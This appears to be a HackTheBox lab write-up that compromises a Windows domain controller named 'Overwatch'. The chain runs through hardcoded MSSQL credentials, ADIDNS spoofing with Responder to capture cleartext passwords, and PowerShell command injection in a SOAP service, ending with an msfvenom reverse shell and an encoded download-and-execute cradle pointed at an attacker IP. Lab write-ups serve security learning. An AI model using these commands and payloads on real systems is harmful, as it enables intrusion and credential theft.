---
title: Overwatch - HTB
date: 2026-02-24
categories: [WriteUps, HTB]
tags: [HTB, windows, AD, privesc, MSSQL, dnSpy]
image:
  base: /assets/img/posts/htb/overwatch
active: false
difficulty: medium
os: windows
description: "Overwatch is a HackTheBox machine (no season)."
pawned: root
---

## Scan

```bash
sudo nmap -n -Pn -p- -oN full_scan.txt 10.129.4.44
# 53/tcp   - DNS
# 88/tcp   - Kerberos  -> DC confirmed
# 445/tcp  - SMB
# 5985/tcp - WinRM
# 6520/tcp - MSSQL (non-standard port)
# 3389/tcp - RDP

nmap -sC -sV -Pn -p6520 10.129.4.44
# Microsoft SQL Server 2022 16.00.1000 (RTM)
# DNS_Domain_Name: overwatch.htb
# NetBIOS_Computer_Name: S200401
```

```bash
echo '10.129.4.44 overwatch.htb S200401.overwatch.htb' | sudo tee -a /etc/hosts
```

---

## Foothold

### Guest SMB Access -> Binary

Anonymous SMB access reveals a software share:

![SMB Share Opened](/assets/img/posts/htb/overwatch/shares-0.png)

![SMB Share Found Folder](/assets/img/posts/htb/overwatch/shares-1.png)

```bash
smbclient.py -no-pass 'overwatch.htb/guest@10.129.4.44'

# shares -> software$ is accessible
# cd Monitoring
# ls
# overwatch.exe  overwatch.exe.config  overwatch.pdb  ...
```

`overwatch.exe.config` reveals an internal service:

```xml
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

### Reverse Engineering overwatch.exe

Download all files and decompile with dnSpy. The `Program` class contains hardcoded DB credentials:

```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

> Credentials: `OVERWATCH\sqlsvc:TI0LKcfHzZw1Vv`

---

## User

### MSSQL Enumeration

```bash
mssqlclient.py 'OVERWATCH/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb' -port 6520 -windows-auth
```

```sql
SELECT name FROM master..sysdatabases;
-- master, tempdb, model, msdb, overwatch

USE overwatch;
-- sqlsvc is dbo on the overwatch database

EXEC sp_linkedservers;
-- S200401\SQLEXPRESS  (local)
-- SQL07               (linked - not reachable)
```

Querying `SQL07` fails with a connection error. The DNS record does not exist yet, which means we can poison it.

### ADIDNS Spoofing -> Credential Capture

By default, any authenticated user can add DNS records in Active Directory via LDAP. We add a fake `SQL07` A record pointing to our machine, then trigger the linked server query to capture the cleartext credentials sent by MSSQL.

**Step 1 - Add DNS record:**

```bash
python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --record 'SQL07' --action 'add' --data 10.10.16.95 --type A \
  S200401.overwatch.htb
# [+] LDAP operation completed successfully
```

**Step 2 - Start Responder:**

```bash
sudo responder -I tun0 -i 10.10.16.95
```

**Step 3 - Trigger the linked server connection:**

```sql
SELECT VERSION FROM OPENQUERY("SQL07", 'SELECT @@VERSION AS VERSION');
-- Connection forcibly closed -> Responder catches the authentication
```

**Step 4 - Check Responder:**

```
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

> Credentials: `OVERWATCH\sqlmgmt:bIhBbzMMnB82yx`

### WinRM Access

BloodHound confirms `sqlmgmt` is a member of `Remote Management Users`:

![RM USERS](/assets/img/posts/htb/overwatch/sqlmgmt_remote_management_users_group.png)

```bash
evil-winrm -i 10.129.4.44 -u sqlmgmt -p 'bIhBbzMMnB82yx'
# overwatch\sqlmgmt

type C:\Users\sqlmgmt\Desktop\user.txt
```

![RM CONNECT](/assets/img/posts/htb/overwatch/winrm_connect.png)

---

## Root

### Internal SOAP Service

The `overwatch.exe` process is running and listening on `127.0.0.1:8000`:

```powershell
Test-NetConnection -Port 8000 127.0.0.1
# TcpTestSucceeded : True

Get-Process overwatch
# overwatch  PID 4756
```

Fetch the WSDL to confirm the exposed methods:

```powershell
iwr -UseBasicParsing "http://127.0.0.1:8000/MonitorService?wsdl"
# Operations: StartMonitoring, StopMonitoring, KillProcess
```

### KillProcess PowerShell Injection

From the decompiled source, `KillProcess` builds a PowerShell command via string concatenation and runs it through a pipeline:

```csharp
string psCommand = "Stop-Process -Name " + processName + " -Force";
pipeline.Commands.AddScript(psCommand);
pipeline.Commands.Add("Out-String");
```

The `processName` parameter is injected directly - we can break the `Stop-Process` call and chain our own command using a semicolon and a trailing comment to neutralize `-Force`:

```
random; Start-Process -FilePath cmd -ArgumentList '/c <COMMAND>' # -Force
```

**Read root flag:**

```powershell
$cmd = "random; Start-Process -FilePath cmd -ArgumentList '/c type C:\Users\Administrator\Desktop\root.txt > C:\Users\sqlmgmt\Downloads\out.txt' # -Force"
$body = "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>
  <s:Body>
    <KillProcess xmlns='http://tempuri.org/'>
      <processName>$cmd</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>"

iwr -UseBasicParsing -Uri "http://127.0.0.1:8000/MonitorService" `
    -Method POST -Body $body `
    -ContentType "text/xml; charset=utf-8" `
    -Headers @{"SOAPAction"='"http://tempuri.org/IMonitoringService/KillProcess"'}

type C:\Users\sqlmgmt\Downloads\out.txt
```

![MonitorService Flag Admin](/assets/img/posts/htb/overwatch/admin_flag.png)

### Bonus - SYSTEM Shell

Craft a reverse shell payload and download/execute it via the same injection:

```bash
# On attacker
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.95 LPORT=4444 \
  -e x64/xor_dynamic -f ps1 -o /var/www/html/run.txt

B64=$(python3 -c "import base64; \
  print(base64.b64encode(\"(New-Object System.Net.WebClient).DownloadString('http://10.10.16.95/run.txt') | IEX\".encode('utf-16le')).decode())")
```

```powershell
# On target - inject the cradle
$cmd = "random; Start-Process -FilePath cmd -ArgumentList '/c powershell -enc $B64' # -Force"
```

```
nt authority\system
```